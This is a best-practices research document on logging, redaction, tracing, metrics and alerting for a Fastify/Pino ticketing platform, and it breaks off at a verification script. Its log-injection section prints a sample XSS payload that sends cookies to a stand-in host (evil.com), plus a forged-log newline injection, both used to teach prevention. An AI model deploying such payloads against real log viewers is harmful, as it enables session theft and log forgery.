# Logging & Observability Standards & Best Practices
## TicketToken Platform - Comprehensive Research Document

**Stack:** Node.js/TypeScript/Fastify (Pino), PostgreSQL/Knex, Redis, Stripe, Solana, Microservices Architecture

---

## Table of Contents

1. [Standards & Best Practices](#1-standards--best-practices)
2. [Common Vulnerabilities & Mistakes](#2-common-vulnerabilities--mistakes)
3. [Audit Checklist](#3-audit-checklist)
4. [Sources & References](#4-sources--references)

---

## 1. Standards & Best Practices

### 1.1 Structured Logging Formats

#### JSON Logging with Pino (Fastify Default)

Fastify uses Pino as its default logger, which outputs structured JSON logs optimized for machine parsing and log aggregation systems.

```typescript
// Basic Fastify logging configuration
import Fastify from 'fastify';

const fastify = Fastify({
  logger: {
    level: process.env.LOG_LEVEL || 'info',
    // Production: JSON output
    // Development: Pretty printing
    ...(process.env.NODE_ENV === 'development' && {
      transport: {
        target: 'pino-pretty',
        options: {
          translateTime: 'HH:MM:ss Z',
          ignore: 'pid,hostname'
        }
      }
    })
  }
});
```

**Standard Pino JSON Output:**
```json
{
  "level": 30,
  "time": 1702000000000,
  "pid": 12345,
  "hostname": "ticket-service-7b8f9c",
  "reqId": "req-1",
  "req": {
    "method": "POST",
    "url": "/api/v1/tickets",
    "hostname": "api.tickettoken.com"
  },
  "msg": "incoming request"
}
```

**Source:** https://fastify.dev/docs/latest/Reference/Logging/

#### Elastic Common Schema (ECS)

ECS provides a standardized field naming convention for logs, enabling correlation across services and integration with Elasticsearch/Kibana.

```typescript
import pino from 'pino';
import ecsFormat from '@elastic/ecs-pino-format';

const logger = pino({
  ...ecsFormat(),
  level: 'info'
});

// Output follows ECS format
logger.info({ 
  user: { id: 'user-123' },
  event: { action: 'ticket.purchased' }
}, 'Ticket purchased successfully');
```

**ECS Core Fields:**
| Field | Description | Example |
|-------|-------------|---------|
| `@timestamp` | Event timestamp (ISO 8601) | `2024-01-15T10:30:00.000Z` |
| `log.level` | Log severity | `info`, `error`, `warn` |
| `message` | Human-readable message | `"User login successful"` |
| `service.name` | Service identifier | `"ticket-service"` |
| `trace.id` | Distributed trace ID | `"abc123..."` |
| `span.id` | Span within trace | `"def456..."` |
| `error.message` | Error description | `"Connection refused"` |
| `error.stack_trace` | Stack trace | Full stack trace |

**Source:** https://www.elastic.co/docs/reference/ecs/logging/intro

#### Recommended Log Structure for TicketToken

```typescript
interface TicketTokenLogEntry {
  // Required fields
  timestamp: string;           // ISO 8601
  level: 'trace' | 'debug' | 'info' | 'warn' | 'error' | 'fatal';
  message: string;
  service: string;             // e.g., "ticket-service", "payment-service"
  
  // Correlation
  correlationId: string;       // X-Correlation-ID header
  requestId?: string;          // Fastify request ID
  traceId?: string;            // OpenTelemetry trace ID
  spanId?: string;             // OpenTelemetry span ID
  
  // Context
  userId?: string;             // Authenticated user (never PII)
  eventId?: string;            // Business event ID
  
  // Error details (when applicable)
  error?: {
    name: string;
    message: string;
    code?: string;
    stack?: string;            // Only in non-production
  };
  
  // Performance
  duration_ms?: number;
  
  // Environment
  environment: string;         // production, staging, development
  version: string;             // Service version
}
```

---

### 1.2 Log Levels and When to Use Each

#### Pino/Fastify Log Levels

| Level | Numeric | When to Use | Example |
|-------|---------|-------------|---------|
| **fatal** | 60 | Application crash, unrecoverable errors | Database connection permanently lost |
| **error** | 50 | Operation failed, requires attention | Payment processing failed |
| **warn** | 40 | Unexpected but recoverable situation | Rate limit approaching, deprecated API used |
| **info** | 30 | Normal operations, state changes | User logged in, ticket purchased |
| **debug** | 20 | Development troubleshooting | Request payload, query parameters |
| **trace** | 10 | Detailed execution flow | Function entry/exit, iteration details |

**Source:** https://betterstack.com/community/guides/logging/log-levels-explained/

#### Level Selection Guidelines

```typescript
// FATAL - Application cannot continue
logger.fatal({ err }, 'Database connection pool exhausted, shutting down');
process.exit(1);

// ERROR - Operation failed, needs investigation
logger.error({ 
  err, 
  userId, 
  eventId,
  paymentId 
}, 'Payment processing failed');

// WARN - Potential issue, monitor for patterns
logger.warn({ 
  userId, 
  attemptCount: 8,
  lockoutAt: 10
}, 'Multiple failed login attempts');

// INFO - Normal business events (audit trail)
logger.info({ 
  userId, 
  ticketId, 
  eventId,
  action: 'ticket.purchased'
}, 'Ticket purchased successfully');

// DEBUG - Development/troubleshooting (disabled in production)
logger.debug({ 
  query: sanitizedQuery,
  params: sanitizedParams
}, 'Executing database query');

// TRACE - Detailed flow (rarely enabled)
logger.trace({ step: 'validation', field: 'email' }, 'Validating input field');
```

#### Production Log Level Configuration

```typescript
// Environment-based log levels
const LOG_LEVELS = {
  production: 'info',    // info, warn, error, fatal only
  staging: 'debug',      // Include debug for testing
  development: 'trace',  // Full verbosity
  test: 'silent'         // Suppress logs in tests
} as const;

const fastify = Fastify({
  logger: {
    level: LOG_LEVELS[process.env.NODE_ENV] || 'info'
  }
});
```

**Source:** https://sematext.com/blog/logging-levels/

---

### 1.3 What to Log vs What NOT to Log

#### MUST Log (Security Events)

Per OWASP guidelines, these security events MUST be logged:

| Category | Events to Log |
|----------|---------------|
| **Authentication** | Login success/failure, logout, password changes, MFA events |
| **Authorization** | Access denied, privilege escalation attempts, role changes |
| **Session** | Creation, destruction, timeout, hijacking attempts |
| **Input Validation** | Validation failures, malformed requests, injection attempts |
| **Application Errors** | Exceptions, crashes, unexpected states |
| **High-Value Transactions** | Purchases, refunds, transfers, admin actions |
| **Data Access** | Sensitive data queries, exports, bulk operations |

**Source:** https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html

```typescript
// Security event logging examples
const securityLogger = {
  authSuccess: (userId: string, method: string) => {
    logger.info({ 
      event: 'authn_login_success',
      userId,
      method,  // 'password', 'oauth', 'mfa'
      level: 'INFO'
    }, 'User authentication successful');
  },
  
  authFailure: (identifier: string, reason: string, ip: string) => {
    logger.warn({
      event: 'authn_login_fail',
      identifier: hashIdentifier(identifier),  // Never log actual username
      reason,
      sourceIp: ip,
      level: 'WARN'
    }, 'Authentication failed');
  },
  
  authzDenied: (userId: string, resource: string, action: string) => {
    logger.warn({
      event: 'authz_fail',
      userId,
      resource,
      action,
      level: 'WARN'
    }, 'Authorization denied');
  },
  
  privilegeEscalation: (userId: string, oldRole: string, newRole: string) => {
    logger.info({
      event: 'privilege_change',
      userId,
      oldRole,
      newRole,
      level: 'INFO'
    }, 'User privileges changed');
  }
};
```

**Source:** https://cheatsheetseries.owasp.org/cheatsheets/Logging_Vocabulary_Cheat_Sheet.html

#### NEVER Log (Sensitive Data)

| Category | Examples | Risk |
|----------|----------|------|
| **Credentials** | Passwords, API keys, tokens, secrets | Account compromise |
| **PII** | SSN, full names, addresses, phone numbers | Privacy violation, GDPR breach |
| **Financial** | Full card numbers, bank accounts, CVV | PCI-DSS violation |
| **Health** | Medical records, conditions | HIPAA violation |
| **Session Data** | Session tokens, JWT contents | Session hijacking |
| **Encryption Keys** | Private keys, certificates | Cryptographic compromise |

**Source:** https://owasp.org/Top10/2021/A09_2021-Security_Logging_and_Monitoring_Failures/

#### Pino Redaction Configuration

```typescript
import Fastify from 'fastify';

const fastify = Fastify({
  logger: {
    level: 'info',
    redact: {
      paths: [
        // Request headers
        'req.headers.authorization',
        'req.headers.cookie',
        'req.headers["x-api-key"]',
        
        // Request body fields
        'req.body.password',
        'req.body.currentPassword',
        'req.body.newPassword',
        'req.body.creditCard',
        'req.body.cardNumber',
        'req.body.cvv',
        'req.body.ssn',
        'req.body.socialSecurityNumber',
        
        // User objects
        '*.password',
        '*.passwordHash',
        '*.token',
        '*.refreshToken',
        '*.accessToken',
        '*.apiKey',
        '*.secret',
        '*.privateKey',
        
        // Stripe specific
        '*.stripeCustomerId',
        '*.paymentMethodId',
        
        // Solana specific
        '*.privateKey',
        '*.secretKey',
        '*.mnemonic',
        '*.seed'
      ],
      censor: '[REDACTED]'
    }
  }
});
```

**Source:** https://www.dash0.com/guides/logging-in-node-js-with-pino

#### Safe Logging Patterns

```typescript
// ❌ BAD - Logs sensitive data
logger.info({ user }, 'User created');  // May contain password hash, email, etc.

// ✅ GOOD - Explicit field selection
logger.info({ 
  userId: user.id,
  role: user.role,
  createdAt: user.createdAt
}, 'User created');

// ❌ BAD - Logs entire request
logger.debug({ req: request }, 'Incoming request');

// ✅ GOOD - Log only safe fields
logger.debug({
  method: request.method,
  url: request.url,
  correlationId: request.headers['x-correlation-id']
}, 'Incoming request');

// ❌ BAD - Logs payment details
logger.info({ payment }, 'Payment processed');

// ✅ GOOD - Log only references
logger.info({
  paymentId: payment.id,
  amount: payment.amount,
  currency: payment.currency,
  status: payment.status,
  // Last 4 digits only if needed
  cardLast4: payment.cardLast4
}, 'Payment processed');
```

---

### 1.4 Distributed Tracing (OpenTelemetry)

#### OpenTelemetry Setup for Node.js

```typescript
// tracing.ts - Load BEFORE any other imports
import { NodeSDK } from '@opentelemetry/sdk-node';
import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';
import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';
import { Resource } from '@opentelemetry/resources';
import { SemanticResourceAttributes } from '@opentelemetry/semantic-conventions';

const sdk = new NodeSDK({
  resource: new Resource({
    [SemanticResourceAttributes.SERVICE_NAME]: 'ticket-service',
    [SemanticResourceAttributes.SERVICE_VERSION]: process.env.APP_VERSION,
    [SemanticResourceAttributes.DEPLOYMENT_ENVIRONMENT]: process.env.NODE_ENV
  }),
  traceExporter: new OTLPTraceExporter({
    url: process.env.OTEL_EXPORTER_OTLP_ENDPOINT || 'http://localhost:4318/v1/traces'
  }),
  instrumentations: [
    getNodeAutoInstrumentations({
      // Instrument HTTP, Express/Fastify, PostgreSQL, Redis, etc.
      '@opentelemetry/instrumentation-fs': { enabled: false }  // Disable noisy fs instrumentation
    })
  ]
});

sdk.start();

// Graceful shutdown
process.on('SIGTERM', () => {
  sdk.shutdown().then(() => process.exit(0));
});
```

**Source:** https://betterstack.com/community/guides/observability/opentelemetry-nodejs-tracing/

#### Correlation ID Propagation

```typescript
// Fastify plugin for correlation ID
import { FastifyPluginAsync } from 'fastify';
import { v4 as uuidv4 } from 'uuid';
import { context, trace } from '@opentelemetry/api';

const correlationPlugin: FastifyPluginAsync = async (fastify) => {
  fastify.addHook('onRequest', async (request, reply) => {
    // Get or generate correlation ID
    const correlationId = 
      request.headers['x-correlation-id'] as string ||
      request.headers['x-request-id'] as string ||
      uuidv4();
    
    // Get OpenTelemetry trace context
    const span = trace.getActiveSpan();
    const traceId = span?.spanContext().traceId;
    const spanId = span?.spanContext().spanId;
    
    // Attach to request for logging
    request.correlationId = correlationId;
    request.traceId = traceId;
    request.spanId = spanId;
    
    // Set response header
    reply.header('x-correlation-id', correlationId);
  });
  
  // Add to all child loggers
  fastify.addHook('preHandler', async (request) => {
    request.log = request.log.child({
      correlationId: request.correlationId,
      traceId: request.traceId,
      spanId: request.spanId
    });
  });
};
```

#### Manual Span Creation

```typescript
import { trace, SpanStatusCode } from '@opentelemetry/api';

const tracer = trace.getTracer('ticket-service');

async function purchaseTicket(userId: string, eventId: string): Promise<Ticket> {
  return tracer.startActiveSpan('purchaseTicket', async (span) => {
    try {
      span.setAttributes({
        'user.id': userId,
        'event.id': eventId,
        'ticket.operation': 'purchase'
      });
      
      // Check availability
      const available = await tracer.startActiveSpan('checkAvailability', async (childSpan) => {
        const result = await ticketRepo.checkAvailability(eventId);
        childSpan.setAttributes({ 'tickets.available': result.count });
        childSpan.end();
        return result;
      });
      
      // Process payment
      const payment = await tracer.startActiveSpan('processPayment', async (childSpan) => {
        childSpan.setAttributes({ 'payment.provider': 'stripe' });
        const result = await paymentService.charge(userId, eventId);
        childSpan.end();
        return result;
      });
      
      // Create ticket
      const ticket = await ticketRepo.create({ userId, eventId, paymentId: payment.id });
      
      span.setAttributes({ 'ticket.id': ticket.id });
      span.setStatus({ code: SpanStatusCode.OK });
      
      return ticket;
    } catch (error) {
      span.setStatus({ code: SpanStatusCode.ERROR, message: error.message });
      span.recordException(error);
      throw error;
    } finally {
      span.end();
    }
  });
}
```

**Source:** https://signoz.io/opentelemetry/nodejs/

---

### 1.5 Metrics Collection (Prometheus Patterns)

#### Prometheus Client for Node.js

```typescript
import { Registry, Counter, Histogram, Gauge, collectDefaultMetrics } from 'prom-client';

const register = new Registry();

// Collect default Node.js metrics
collectDefaultMetrics({ register });

// Custom metrics
const httpRequestsTotal = new Counter({
  name: 'http_requests_total',
  help: 'Total number of HTTP requests',
  labelNames: ['method', 'route', 'status_code'],
  registers: [register]
});

const httpRequestDuration = new Histogram({
  name: 'http_request_duration_seconds',
  help: 'HTTP request duration in seconds',
  labelNames: ['method', 'route', 'status_code'],
  buckets: [0.01, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5, 10],
  registers: [register]
});

const activeConnections = new Gauge({
  name: 'active_connections',
  help: 'Number of active connections',
  registers: [register]
});

// Business metrics
const ticketsPurchased = new Counter({
  name: 'tickets_purchased_total',
  help: 'Total tickets purchased',
  labelNames: ['event_id', 'ticket_type'],
  registers: [register]
});

const paymentAmount = new Histogram({
  name: 'payment_amount_cents',
  help: 'Payment amounts in cents',
  labelNames: ['currency', 'payment_method'],
  buckets: [1000, 5000, 10000, 25000, 50000, 100000, 250000],
  registers: [register]
});
```

**Source:** https://blog.risingstack.com/node-js-performance-monitoring-with-prometheus/

#### RED Method Metrics

The RED method focuses on three key metrics for request-driven services:

| Metric | Description | Prometheus Query |
|--------|-------------|------------------|
| **Rate** | Requests per second | `sum(rate(http_requests_total[5m]))` |
| **Errors** | Error rate percentage | `sum(rate(http_requests_total{status_code=~"5.."}[5m])) / sum(rate(http_requests_total[5m]))` |
| **Duration** | Request latency (P95) | `histogram_quantile(0.95, sum(rate(http_request_duration_seconds_bucket[5m])) by (le))` |

**Source:** https://nodeshift.dev/nodejs-reference-architecture/operations/metrics/

#### Fastify Metrics Plugin

```typescript
import Fastify from 'fastify';
import metricsPlugin from 'fastify-metrics';

const fastify = Fastify({ logger: true });

await fastify.register(metricsPlugin, {
  endpoint: '/metrics',
  defaultMetrics: { enabled: true },
  routeMetrics: {
    enabled: true,
    groupStatusCodes: true,
    routeBlacklist: ['/metrics', '/health']
  }
});

// Custom business metrics
fastify.addHook('onResponse', async (request, reply) => {
  // Track ticket purchases
  if (request.url === '/api/v1/tickets' && request.method === 'POST' && reply.statusCode === 201) {
    ticketsPurchased.inc({
      event_id: request.body.eventId,
      ticket_type: request.body.ticketType
    });
  }
});
```

#### Metric Naming Conventions

```
# Format: <namespace>_<name>_<unit>_<suffix>

# Counters (always use _total suffix)
tickettoken_http_requests_total
tickettoken_tickets_sold_total
tickettoken_payment_failures_total

# Histograms (use _seconds, _bytes, etc.)
tickettoken_http_request_duration_seconds
tickettoken_payment_processing_duration_seconds
tickettoken_database_query_duration_seconds

# Gauges (current value)
tickettoken_active_connections
tickettoken_tickets_available
tickettoken_queue_depth
```

**Source:** https://betterstack.com/community/guides/monitoring/prometheus-best-practices/

---

### 1.6 Log Aggregation and Retention

#### Centralized Logging Architecture

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  ticket-service │────▶│                 │     │                 │
├─────────────────┤     │    Filebeat /   │────▶│  Elasticsearch  │
│ payment-service │────▶│    Fluent Bit   │     │  / OpenSearch   │
├─────────────────┤     │                 │     │                 │
│  event-service  │────▶│  (Log Shipper)  │     └────────┬────────┘
└─────────────────┘     └─────────────────┘              │
                                                         ▼
                                                ┌─────────────────┐
                                                │     Kibana /    │
                                                │    Grafana      │
                                                └─────────────────┘
```

#### Retention Policies

| Log Type | Retention | Reason |
|----------|-----------|--------|
| Security/Audit | 1-7 years | Compliance (PCI-DSS, SOC 2) |
| Error logs | 90 days | Debugging, trend analysis |
| Application logs | 30-60 days | Operational monitoring |
| Debug logs | 7-14 days | Troubleshooting |
| Access logs | 30-90 days | Traffic analysis |

**Source:** https://www.indusface.com/blog/owasp-a09-logging-monitoring-failures/

#### Log Shipping with Pino

```typescript
import pino from 'pino';
import { multistream } from 'pino-multi-stream';

// Multiple destinations for different purposes
const streams = [
  // Console for local development
  { stream: process.stdout },
  
  // File for local backup
  { 
    stream: pino.destination({
      dest: '/var/log/tickettoken/app.log',
      sync: false,
      mkdir: true
    })
  },
  
  // Security events to separate stream
  {
    level: 'warn',
    stream: pino.destination({
      dest: '/var/log/tickettoken/security.log',
      sync: true  // Sync for security logs
    })
  }
];

const logger = pino({
  level: 'info'
}, multistream(streams));
```

---

### 1.7 Alerting Strategies

#### Alert Severity Levels

| Severity | Response Time | Examples | Notification |
|----------|---------------|----------|--------------|
| **P1 Critical** | < 5 min | Service down, data breach, payment failures > 50% | Page on-call, all channels |
| **P2 High** | < 30 min | Error rate > 10%, latency > 5s, auth failures spike | Page on-call |
| **P3 Medium** | < 4 hours | Error rate > 5%, warnings increasing | Slack channel |
| **P4 Low** | Next business day | Non-critical warnings, capacity planning | Email, ticket |

**Source:** https://zenduty.com/blog/log-levels/

#### Alert Rules Examples (Prometheus Alertmanager)

```yaml
groups:
  - name: tickettoken-alerts
    rules:
      # P1: Service completely down
      - alert: ServiceDown
        expr: up{job="ticket-service"} == 0
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: "Ticket service is down"
          description: "{{ $labels.instance }} has been down for more than 1 minute"

      # P1: High error rate
      - alert: HighErrorRate
        expr: |
          sum(rate(http_requests_total{status_code=~"5.."}[5m])) 
          / sum(rate(http_requests_total[5m])) > 0.5
        for: 2m
        labels:
          severity: critical
        annotations:
          summary: "Error rate above 50%"

      # P2: Elevated error rate
      - alert: ElevatedErrorRate
        expr: |
          sum(rate(http_requests_total{status_code=~"5.."}[5m])) 
          / sum(rate(http_requests_total[5m])) > 0.1
        for: 5m
        labels:
          severity: high
        annotations:
          summary: "Error rate above 10%"

      # P2: High latency
      - alert: HighLatency
        expr: |
          histogram_quantile(0.95, sum(rate(http_request_duration_seconds_bucket[5m])) by (le)) > 5
        for: 5m
        labels:
          severity: high
        annotations:
          summary: "P95 latency above 5 seconds"

      # P2: Authentication failures spike
      - alert: AuthFailureSpike
        expr: |
          sum(increase(auth_failures_total[5m])) > 100
        for: 2m
        labels:
          severity: high
        annotations:
          summary: "Unusual number of authentication failures"

      # P3: Payment failure rate elevated
      - alert: PaymentFailures
        expr: |
          sum(rate(payment_failures_total[5m])) 
          / sum(rate(payments_total[5m])) > 0.05
        for: 10m
        labels:
          severity: medium
        annotations:
          summary: "Payment failure rate above 5%"
```

#### Log-Based Alerts

```typescript
// Alert on specific log patterns
const alertPatterns = [
  {
    pattern: 'authn_login_fail',
    threshold: 10,
    window: '5m',
    severity: 'high',
    description: 'Multiple failed login attempts'
  },
  {
    pattern: 'authz_fail',
    threshold: 5,
    window: '1m',
    severity: 'high',
    description: 'Authorization failures detected'
  },
  {
    pattern: 'privilege_change',
    threshold: 1,
    window: '1m',
    severity: 'medium',
    description: 'Privilege escalation detected'
  }
];
```

---

## 2. Common Vulnerabilities & Mistakes

### 2.1 Logging Sensitive Data

**VULNERABILITY:** Accidentally logging passwords, tokens, PII, or payment data.

#### Common Mistakes

```typescript
// ❌ BAD: Logging entire request body
logger.info({ body: req.body }, 'Received request');
// May include: password, credit card, SSN

// ❌ BAD: Logging user object
logger.info({ user }, 'User logged in');
// May include: passwordHash, email, phone, address

// ❌ BAD: Logging error with full context
logger.error({ err, req }, 'Request failed');
// Error may include: authorization headers, tokens

// ❌ BAD: Logging API responses
logger.debug({ response: stripeResponse }, 'Stripe API response');
// May include: full card numbers, customer data
```

#### Safe Patterns

```typescript
// ✅ GOOD: Explicit field selection
logger.info({
  userId: user.id,
  action: 'login',
  method: 'password'
}, 'User logged in');

// ✅ GOOD: Redaction configuration
const logger = pino({
  redact: {
    paths: ['*.password', '*.token', '*.authorization', 'req.body.creditCard'],
    censor: '[REDACTED]'
  }
});

// ✅ GOOD: Safe error logging
logger.error({
  errorCode: err.code,
  errorMessage: err.message,
  userId: req.userId,
  requestId: req.id
}, 'Request failed');

// ✅ GOOD: Stripe logging with safe fields only
logger.info({
  paymentIntentId: pi.id,
  status: pi.status,
  amount: pi.amount,
  currency: pi.currency
}, 'Payment processed');
```

**Source:** https://owasp.org/Top10/2021/A09_2021-Security_Logging_and_Monitoring_Failures/

---

### 2.2 Missing Correlation IDs

**VULNERABILITY:** Cannot trace requests across microservices, making debugging impossible.

#### The Problem

```
User Request → API Gateway → Ticket Service → Payment Service → Solana Service
                   ↓              ↓                ↓                ↓
               No ID          No ID            No ID            No ID
```

Each service logs independently with no way to correlate events from a single user request.

#### The Solution

```typescript
// Generate/propagate correlation ID
const correlationId = req.headers['x-correlation-id'] || uuid();

// Include in ALL logs
logger.info({ correlationId, userId }, 'Processing ticket purchase');

// Propagate to downstream services
await axios.post('http://payment-service/charge', payload, {
  headers: {
    'X-Correlation-ID': correlationId,
    'X-Request-ID': req.id
  }
});

// Include in error responses
reply.status(500).send({
  type: 'https://api.tickettoken.com/errors/internal',
  title: 'Internal Server Error',
  status: 500,
  correlationId  // For customer support reference
});
```

**Source:** https://last9.io/blog/opentelemetry-express/

---

### 2.3 Inconsistent Log Formats Across Services

**VULNERABILITY:** Different log formats make aggregation and querying impossible.

#### The Problem

```
// Service A (custom format)
"2024-01-15 10:30:00 [INFO] User 123 logged in"

// Service B (JSON, different structure)
{"ts":"2024-01-15T10:30:00Z","severity":"info","user_id":"123","msg":"login"}

// Service C (different JSON structure)
{"timestamp":1705314600000,"level":30,"userId":123,"message":"User logged in"}
```

#### The Solution: Shared Logger Configuration

```typescript
// packages/logger/src/index.ts
import pino from 'pino';

interface LoggerOptions {
  service: string;
  version: string;
}

export function createLogger(options: LoggerOptions) {
  return pino({
    level: process.env.LOG_LEVEL || 'info',
    base: {
      service: options.service,
      version: options.version,
      environment: process.env.NODE_ENV
    },
    timestamp: pino.stdTimeFunctions.isoTime,
    formatters: {
      level: (label) => ({ level: label })
    },
    redact: {
      paths: [
        '*.password',
        '*.token',
        '*.authorization',
        'req.headers.authorization',
        'req.headers.cookie'
      ],
      censor: '[REDACTED]'
    }
  });
}

// Usage in each service
import { createLogger } from '@tickettoken/logger';

const logger = createLogger({
  service: 'ticket-service',
  version: process.env.APP_VERSION
});
```

---

### 2.4 Log Injection Attacks

**VULNERABILITY:** Attackers inject malicious content into logs to forge entries, trigger XSS in log viewers, or exploit log parsers.

#### Attack Examples

```typescript
// Attacker submits username with newline injection
const maliciousUsername = 'admin\n2024-01-15 [INFO] User admin login successful';

// ❌ BAD: Unsanitized logging
logger.info(`User login attempt: ${maliciousUsername}`);
// Creates fake "successful login" log entry

// Attacker submits XSS payload
const xssPayload = '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>';
logger.info(`Search query: ${xssPayload}`);
// If logs viewed in web UI, XSS executes
```

**Source:** https://owasp.org/www-community/attacks/Log_Injection

#### Prevention

```typescript
// 1. Use structured logging (Pino does this automatically)
logger.info({ username }, 'Login attempt');  // ✅ Username is JSON-escaped

// 2. Sanitize user input before logging
function sanitizeForLog(input: string): string {
  return input
    .replace(/[\r\n]/g, ' ')  // Remove newlines
    .replace(/[<>]/g, '')     // Remove HTML brackets
    .substring(0, 200);        // Limit length
}

logger.info({ 
  username: sanitizeForLog(username) 
}, 'Login attempt');

// 3. Validate log entry format
const LOG_SAFE_PATTERN = /^[\w\s\-@.]+$/;
if (!LOG_SAFE_PATTERN.test(userInput)) {
  logger.warn({ 
    inputHash: hash(userInput),
    inputLength: userInput.length 
  }, 'Suspicious input detected');
}
```

**Source:** https://wiki.sei.cmu.edu/confluence/display/java/IDS03-J.+Do+not+log+unsanitized+user+input

---

### 2.5 Missing Audit Trails for Security Events

**VULNERABILITY:** Security events not logged, making breach investigation impossible.

#### Required Security Events

Per OWASP, these events MUST have audit trails:

```typescript
const securityEvents = {
  // Authentication
  'authn_login_success': 'INFO',
  'authn_login_fail': 'WARN',
  'authn_logout': 'INFO',
  'authn_password_change': 'INFO',
  'authn_password_change_fail': 'WARN',
  'authn_mfa_enabled': 'INFO',
  'authn_mfa_disabled': 'WARN',
  
  // Authorization
  'authz_access_denied': 'WARN',
  'authz_privilege_escalation': 'WARN',
  'authz_role_change': 'INFO',
  
  // Session
  'session_created': 'INFO',
  'session_expired': 'INFO',
  'session_revoked': 'WARN',
  
  // Data Access
  'data_export': 'INFO',
  'data_delete': 'WARN',
  'data_bulk_access': 'INFO',
  
  // High-Value Transactions
  'payment_success': 'INFO',
  'payment_failure': 'WARN',
  'refund_issued': 'INFO',
  'ticket_transfer': 'INFO',
  
  // Admin Actions
  'admin_user_create': 'INFO',
  'admin_user_delete': 'WARN',
  'admin_config_change': 'WARN'
};
```

**Source:** https://cheatsheetseries.owasp.org/cheatsheets/Logging_Vocabulary_Cheat_Sheet.html

#### Audit Log Implementation

```typescript
interface AuditLogEntry {
  timestamp: string;
  event: string;
  level: string;
  actor: {
    userId: string;
    role: string;
    ip: string;
    userAgent: string;
  };
  target?: {
    type: string;
    id: string;
  };
  result: 'success' | 'failure';
  reason?: string;
  correlationId: string;
}

class AuditLogger {
  private logger: pino.Logger;
  
  constructor() {
    // Separate audit log stream with integrity protection
    this.logger = pino({
      level: 'info'
    }, pino.destination({
      dest: '/var/log/tickettoken/audit.log',
      sync: true,  // Synchronous writes for integrity
      mkdir: true
    }));
  }
  
  log(entry: Omit<AuditLogEntry, 'timestamp'>) {
    this.logger.info({
      ...entry,
      timestamp: new Date().toISOString(),
      type: 'audit'
    });
  }
}

// Usage
auditLogger.log({
  event: 'authn_login_success',
  level: 'INFO',
  actor: {
    userId: user.id,
    role: user.role,
    ip: request.ip,
    userAgent: request.headers['user-agent']
  },
  result: 'success',
  correlationId: request.correlationId
});
```

---

### 2.6 Over-Logging (Performance & Cost Impact)

**VULNERABILITY:** Excessive logging degrades performance and increases storage costs.

#### Symptoms

- DEBUG level enabled in production
- Logging every database query
- Logging large request/response bodies
- High cardinality labels in metrics
- No log sampling for high-volume events

#### Solutions

```typescript
// 1. Use appropriate log levels
const logLevel = process.env.NODE_ENV === 'production' ? 'info' : 'debug';

// 2. Sample high-volume logs
function shouldLog(eventType: string, sampleRate: number = 0.01): boolean {
  if (eventType === 'health_check') return false;  // Never log health checks
  if (Math.random() > sampleRate) return false;    // Sample at 1%
  return true;
}

// 3. Rate limit log output
import { RateLimiter } from 'limiter';
const logLimiter = new RateLimiter({ tokensPerInterval: 100, interval: 'second' });

async function rateLimitedLog(logger: pino.Logger, level: string, msg: string, data: object) {
  if (await logLimiter.tryRemoveTokens(1)) {
    logger[level](data, msg);
  }
}

// 4. Avoid logging large objects
const MAX_LOG_OBJECT_SIZE = 1000;

function truncateForLog(obj: any): any {
  const str = JSON.stringify(obj);
  if (str.length > MAX_LOG_OBJECT_SIZE) {
    return { 
      _truncated: true, 
      _originalSize: str.length,
      _sample: str.substring(0, 200) + '...'
    };
  }
  return obj;
}

// 5. Don't log in hot paths
// ❌ BAD
for (const item of largeArray) {
  logger.debug({ item }, 'Processing item');
  process(item);
}

// ✅ GOOD
logger.debug({ count: largeArray.length }, 'Processing items');
for (const item of largeArray) {
  process(item);
}
logger.debug({ count: largeArray.length }, 'Finished processing items');
```

---

### 2.7 Under-Logging (Missing Critical Events)

**VULNERABILITY:** Critical events not logged, leaving blind spots in monitoring.

#### Commonly Missed Events

| Event | Impact of Missing |
|-------|-------------------|
| Authentication failures | Cannot detect brute force attacks |
| Authorization denials | Cannot detect privilege escalation |
| Input validation failures | Cannot detect injection attempts |
| Rate limit triggers | Cannot detect DDoS attempts |
| Configuration changes | Cannot track unauthorized changes |
| External service failures | Cannot correlate outages |
| Database errors | Cannot detect data issues |

#### Comprehensive Logging Points

```typescript
// Fastify hooks for comprehensive logging
fastify.addHook('onRequest', async (request) => {
  request.log.info({
    event: 'request_received',
    method: request.method,
    url: request.url,
    userAgent: request.headers['user-agent'],
    correlationId: request.correlationId
  });
});

fastify.addHook('onResponse', async (request, reply) => {
  request.log.info({
    event: 'request_completed',
    statusCode: reply.statusCode,
    responseTime: reply.getResponseTime()
  });
});

fastify.addHook('onError', async (request, reply, error) => {
  request.log.error({
    event: 'request_error',
    error: {
      name: error.name,
      message: error.message,
      code: error.code,
      stack: process.env.NODE_ENV !== 'production' ? error.stack : undefined
    }
  });
});

// Rate limit logging
fastify.register(rateLimit, {
  max: 100,
  timeWindow: '1 minute',
  onExceeded: (request) => {
    request.log.warn({
      event: 'rate_limit_exceeded',
      ip: request.ip,
      userId: request.userId
    });
  }
});

// External service logging
async function callExternalService(url: string, data: any) {
  const start = Date.now();
  try {
    const response = await axios.post(url, data);
    logger.info({
      event: 'external_service_success',
      service: new URL(url).hostname,
      duration_ms: Date.now() - start
    });
    return response;
  } catch (error) {
    logger.error({
      event: 'external_service_failure',
      service: new URL(url).hostname,
      duration_ms: Date.now() - start,
      error: error.message
    });
    throw error;
  }
}
```

---

## 3. Audit Checklist

### 3.1 Log Configuration Checklist

| ID | Check | Severity | Verification |
|----|-------|----------|--------------|
| **LC1** | Structured JSON logging enabled | CRITICAL | `logger.info()` outputs JSON |
| **LC2** | Appropriate log level per environment | HIGH | Production: `info`, Dev: `debug` |
| **LC3** | Redaction configured for sensitive fields | CRITICAL | Check `redact` paths in config |
| **LC4** | Correlation ID middleware installed | CRITICAL | Check `X-Correlation-ID` header handling |
| **LC5** | Request ID generation enabled | HIGH | Check Fastify `requestIdHeader` config |
| **LC6** | Timestamps in ISO 8601 format | MEDIUM | `"time":"2024-01-15T10:30:00.000Z"` |
| **LC7** | Service name/version in base context | HIGH | Check `base` config in Pino |
| **LC8** | Log destination configured (stdout/file) | HIGH | Verify log shipping |
| **LC9** | Log rotation configured | MEDIUM | Check file size/time rotation |
| **LC10** | pino-pretty disabled in production | MEDIUM | Performance impact |

**Verification Script:**

```bash
# Check log configuration
